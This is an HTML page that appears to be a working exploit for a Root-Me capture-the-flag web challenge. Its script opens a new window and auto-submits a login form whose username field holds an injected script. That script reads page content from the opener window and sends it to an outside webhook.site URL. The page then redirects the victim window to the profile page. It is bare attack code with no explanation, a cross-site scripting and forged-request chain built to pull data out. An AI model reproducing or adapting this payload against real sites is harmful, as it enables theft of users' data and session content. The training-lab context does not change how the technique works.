<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Second window</title>
</head>
<body>
<h1>Page 2</h1>

<script>
    window.opener.postMessage({redirect: "go"}, "*");

    const newWin = window.open("about:blank", "_blank");
    const scriptEnd = '</scri' + 'pt>';
    // 2. Créer un formulaire et le soumettre dans la nouvelle fenêtre
    newWin.document.write(`<form method="POST" action="http://challenge01.root-me.org:58003/login">
    <input type="text" name="username" value="<script> new Image().src='https://webhook.site/58dc1216-f192-42b5-8ffe-460f1d989b22?testencoding=1';
    var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://webhook.site/58dc1216-f192-42b5-8ffe-460f1d989b22?g6gResult='+encodeURIComponent(window.opener.document.querySelectorAll('section > p')[2].innerHTML), true);xhr.send();${scriptEnd}">
    <input type="text" name="secret" value="FAILED">
    <input type="submit">
   </form>
   <script>document.forms[0].submit()${scriptEnd}`);


    setTimeout(() => {
        document.location = "http://challenge01.root-me.org:58003/profile"
    }, 3000);


</script>

</body>
</html>